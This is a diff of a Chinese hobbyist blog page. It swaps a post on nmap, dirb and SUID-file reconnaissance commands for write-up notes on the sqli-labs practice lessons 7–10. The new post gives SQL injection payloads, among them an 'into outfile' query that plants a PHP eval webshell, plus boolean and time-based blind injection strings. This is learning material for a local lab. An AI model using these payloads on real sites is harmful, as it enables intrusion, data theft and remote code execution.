@@ -20,28 +20,34 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="对于一个给定对应IP地址的靶场机器挖掘开放服务信息为了得到靶场开放服务和服务版可使用1$nmap -sV +IP 为了得到靶场全部信息1$nmap -A -v+IP 对开放http的服务用浏览器访问1$nmap -o+IP 探索该服务的隐藏文件1$dirb http&#x2F;&#x2F;***&#x2F; 查找具有权限root的文件1$find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null">
+<meta name="description" content="less7（一句话木马的利用）首先按部就班试出 ？id&#x3D;1‘))–+ 利用order by查出数据库列数  提示是use outfile  into outfile 是写文件的指令，资料引用csdn的大佬 利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“菜鸟笔记1号”">
-<meta property="og:url" content="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/index.html">
+<meta property="og:title" content="less7-10">
+<meta property="og:url" content="http://example.com/2021/11/04/less7-8/index.html">
 <meta property="og:site_name" content="wds">
-<meta property="og:description" content="对于一个给定对应IP地址的靶场机器挖掘开放服务信息为了得到靶场开放服务和服务版可使用1$nmap -sV +IP 为了得到靶场全部信息1$nmap -A -v+IP 对开放http的服务用浏览器访问1$nmap -o+IP 探索该服务的隐藏文件1$dirb http&#x2F;&#x2F;***&#x2F; 查找具有权限root的文件1$find &#x2F; -perm -4000 2&gt;&#x2F;dev&#x2F;null">
+<meta property="og:description" content="less7（一句话木马的利用）首先按部就班试出 ？id&#x3D;1‘))–+ 利用order by查出数据库列数  提示是use outfile  into outfile 是写文件的指令，资料引用csdn的大佬 利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-09-19T05:24:27.000Z">
-<meta property="article:modified_time" content="2021-10-25T15:43:41.658Z">
+<meta property="og:image" content="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/04/jZrFiNRp9PG4Az1.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/04/wWXQb2Tgo8EDuBJ.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/04/2d5OTQ68ZArtSMz.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/04/xYsm5MioZyjcPFr.png">
+<meta property="article:published_time" content="2021-11-04T09:53:22.000Z">
+<meta property="article:modified_time" content="2021-11-04T10:13:03.571Z">
 <meta property="article:author" content="发福的小菜狗">
-<meta property="article:tag" content="非常高兴能在b站上找到这么多的“ctf教程”，感谢那些无偿的“搬运姬们”，现在开始学习啦！">
+<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png">
 
 
-<link rel="canonical" href="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/">
+<link rel="canonical" href="http://example.com/2021/11/04/less7-8/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/","path":"2021/09/19/“菜鸟笔记1号”/","title":"“菜鸟笔记1号”"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/11/04/less7-8/","path":"2021/11/04/less7-8/","title":"less7-10"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>“菜鸟笔记1号” | wds</title>
+<title>less7-10 | wds</title>
   
 
 
@@ -120,7 +126,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%B9%E4%BA%8E%E4%B8%80%E4%B8%AA%E7%BB%99%E5%AE%9A%E5%AF%B9%E5%BA%94IP%E5%9C%B0%E5%9D%80%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%9C%BA%E5%99%A8%E6%8C%96%E6%8E%98%E5%BC%80%E6%94%BE%E6%9C%8D%E5%8A%A1%E4%BF%A1%E6%81%AF"><span class="nav-number">1.</span> <span class="nav-text">对于一个给定对应IP地址的靶场机器挖掘开放服务信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BA%86%E5%BE%97%E5%88%B0%E9%9D%B6%E5%9C%BA%E5%BC%80%E6%94%BE%E6%9C%8D%E5%8A%A1%E5%92%8C%E6%9C%8D%E5%8A%A1%E7%89%88%E5%8F%AF%E4%BD%BF%E7%94%A8"><span class="nav-number">1.1.</span> <span class="nav-text">为了得到靶场开放服务和服务版可使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BA%86%E5%BE%97%E5%88%B0%E9%9D%B6%E5%9C%BA%E5%85%A8%E9%83%A8%E4%BF%A1%E6%81%AF"><span class="nav-number">1.2.</span> <span class="nav-text">为了得到靶场全部信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E5%BC%80%E6%94%BEhttp%E7%9A%84%E6%9C%8D%E5%8A%A1%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE"><span class="nav-number">1.3.</span> <span class="nav-text">对开放http的服务用浏览器访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8E%A2%E7%B4%A2%E8%AF%A5%E6%9C%8D%E5%8A%A1%E7%9A%84%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.</span> <span class="nav-text">探索该服务的隐藏文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E5%85%B7%E6%9C%89%E6%9D%83%E9%99%90root%E7%9A%84%E6%96%87%E4%BB%B6"><span class="nav-number">1.5.</span> <span class="nav-text">查找具有权限root的文件</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less7%EF%BC%88%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%88%A9%E7%94%A8%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">less7（一句话木马的利用）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less8"><span class="nav-number">2.</span> <span class="nav-text">less8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.1.</span> <span class="nav-text">方法一 布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%95%E4%BA%8C-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.2.</span> <span class="nav-text">法二 时间盲注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-9%E5%92%8Cless-10"><span class="nav-number">3.</span> <span class="nav-text">less 9和less 10</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -183,7 +189,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/19/%E2%80%9C%E8%8F%9C%E9%B8%9F%E7%AC%94%E8%AE%B01%E5%8F%B7%E2%80%9D/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/04/less7-8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -196,7 +202,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          “菜鸟笔记1号”
+          less7-10
         </h1>
 
         <div class="post-meta-container">
@@ -206,23 +212,17 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
+      
 
-      <time title="Created: 2021-09-19 13:24:27" itemprop="dateCreated datePublished" datetime="2021-09-19T13:24:27+08:00">2021-09-19</time>
+      <time title="Created: 2021-11-04 17:53:22 / Modified: 18:13:03" itemprop="dateCreated datePublished" datetime="2021-11-04T17:53:22+08:00">2021-11-04</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-25 23:43:41" itemprop="dateModified" datetime="2021-10-25T23:43:41+08:00">2021-10-25</time>
-      </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
       <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">常识</span></a>
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
         </span>
     </span>
 
@@ -236,12 +236,32 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"><a href="#对于一个给定对应IP地址的靶场机器挖掘开放服务信息" class="headerlink" title="对于一个给定对应IP地址的靶场机器挖掘开放服务信息"></a>对于一个给定对应IP地址的靶场机器挖掘开放服务信息</h2><h3 id="为了得到靶场开放服务和服务版可使用"><a href="#为了得到靶场开放服务和服务版可使用" class="headerlink" title="为了得到靶场开放服务和服务版可使用"></a>为了得到靶场开放服务和服务版可使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -sV +IP</span><br></pre></td></tr></table></figure>
-<h3 id="为了得到靶场全部信息"><a href="#为了得到靶场全部信息" class="headerlink" title="为了得到靶场全部信息"></a>为了得到靶场全部信息</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -A -v+IP</span><br></pre></td></tr></table></figure>
-<h3 id="对开放http的服务用浏览器访问"><a href="#对开放http的服务用浏览器访问" class="headerlink" title="对开放http的服务用浏览器访问"></a>对开放http的服务用浏览器访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -o+IP</span><br></pre></td></tr></table></figure>
-<h3 id="探索该服务的隐藏文件"><a href="#探索该服务的隐藏文件" class="headerlink" title="探索该服务的隐藏文件"></a>探索该服务的隐藏文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dirb</span> http//***/</span><br></pre></td></tr></table></figure>
-<h3 id="查找具有权限root的文件"><a href="#查找具有权限root的文件" class="headerlink" title="查找具有权限root的文件"></a>查找具有权限root的文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$find</span> / -perm -4000 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<hr>
+        <h1 id="less7（一句话木马的利用）"><a href="#less7（一句话木马的利用）" class="headerlink" title="less7（一句话木马的利用）"></a>less7（一句话木马的利用）</h1><p>首先按部就班试出</p>
+<p>？id=1‘))–+</p>
+<p>利用order by查出数据库列数 </p>
+<p>提示是use outfile </p>
+<p>into outfile 是写文件的指令，资料<a target="_blank" rel="noopener" href="https://blog.csdn.net/cuiruidu3106/article/details/100439103?utm_source=app&app_version=4.17.2&code=app_1562916241&uLinkId=usr1mkqgl919blen">引用csdn的大佬</a></p>
+<p>利用union select 1,2,‘&lt;?php @eval($_post[“crow”]);？&gt;’ into outfile “D:\phpstudy_pro\WWW\sqli-labs\Less-7\a.php”–+将一句话木马写入</p>
+<p><img src="https://i.loli.net/2021/11/04/xWTdpgA8jq5eXht.png" alt="QQ截图20211104171541.png"></p>
+<p>这里报错了没事，现在文件已经写到我们想要的地方</p>
+<p><img src="https://i.loli.net/2021/11/04/jZrFiNRp9PG4Az1.png" alt="QQ截图20211104173133.png"></p>
+<p>然后使用菜刀访问即可！</p>
+<p><img src="https://i.loli.net/2021/11/04/wWXQb2Tgo8EDuBJ.png" alt="QQ截图20211104171109.png"></p>
+<p>ps：操作前提该网站允许文件的读入操作，不然会一直报错且菜刀也访问不到文件。</p>
+<h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><h2 id="方法一-布尔盲注"><a href="#方法一-布尔盲注" class="headerlink" title="方法一 布尔盲注"></a>方法一 布尔盲注</h2><p>输入？id=1‘判断存在注入错误</p>
+<p>输入？id=1’ order by 3–+ 当3改成4时报错说明只有4列</p>
+<p>输入？id=1‘and left（（database（）），1）=’s‘–+ 猜出第一位</p>
+<p>或者采用？id=1’‘and ascii（substr（（database（）），1,1））&gt;16</p>
+<p>或者输入？id=1’ and ascii((select schema_name from information_schema.schemata limit 1,1)1,1)&gt;17–+也可以回应，判断数据库名</p>
+<p>输入？id=1‘and acii（（select table_name from information_schema.tables where table_schema=’scurity’））&gt;115–+判断表名</p>
+<p>输入？id=1’and ascii（（select column_name from information_schema.columns where table_name=’user’））&gt;10–+判断表中字段。</p>
+<p>以上语句配合burpsuite进行使用（与lesson5,6同理）。</p>
+<h2 id="法二-时间盲注"><a href="#法二-时间盲注" class="headerlink" title="法二 时间盲注"></a>法二 时间盲注</h2><p>？id=1‘ and sleep（5）–+判断存在注入 如果可以会延迟5秒回应（对比可见延迟）</p>
+<p><img src="https://i.loli.net/2021/11/04/2d5OTQ68ZArtSMz.png" alt="QQ截图20211104174905.png"></p>
+<p><img src="https://i.loli.net/2021/11/04/xYsm5MioZyjcPFr.png" alt="QQ截图20211104175501.png"></p>
+<p>输入？id=1‘ and if(length(database())=8,1,sleep(5))–+如果为8则页面会较快的刷新，如果不为8则会延迟5秒刷新</p>
+<p>输入？id=1’ and if（ascii（substr（select database（），1,1））&gt;113,1,sleep(5))–+如果当前数据库的第一个字母的ascii值大于113的时候，会立刻返回结果，否则执行5秒</p>
+<h1 id="less-9和less-10"><a href="#less-9和less-10" class="headerlink" title="less 9和less 10"></a>less 9和less 10</h1><p>less9和less10中可以使用时间盲注但不可以使用布尔盲注，less10只是将单引号改成了双引号</p>
 
     </div>
 
@@ -251,21 +271,18 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E9%9D%9E%E5%B8%B8%E9%AB%98%E5%85%B4%E8%83%BD%E5%9C%A8b%E7%AB%99%E4%B8%8A%E6%89%BE%E5%88%B0%E8%BF%99%E4%B9%88%E5%A4%9A%E7%9A%84%E2%80%9Cctf%E6%95%99%E7%A8%8B%E2%80%9D%EF%BC%8C%E6%84%9F%E8%B0%A2%E9%82%A3%E4%BA%9B%E6%97%A0%E5%81%BF%E7%9A%84%E2%80%9C%E6%90%AC%E8%BF%90%E5%A7%AC%E4%BB%AC%E2%80%9D%EF%BC%8C%E7%8E%B0%E5%9C%A8%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E5%95%A6%EF%BC%81/" rel="tag"># 非常高兴能在b站上找到这么多的“ctf教程”，感谢那些无偿的“搬运姬们”，现在开始学习啦！</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/09/18/The-First-Day/" rel="prev" title="The First Day">
-                  <i class="fa fa-chevron-left"></i> The First Day
+                <a href="/2021/10/28/python%E5%AD%A6%E4%B9%A0/" rel="prev" title="python学习">
+                  <i class="fa fa-chevron-left"></i> python学习
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/09/26/%E2%80%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E2%80%9D/" rel="next" title="“冷知识”">
-                  “冷知识” <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
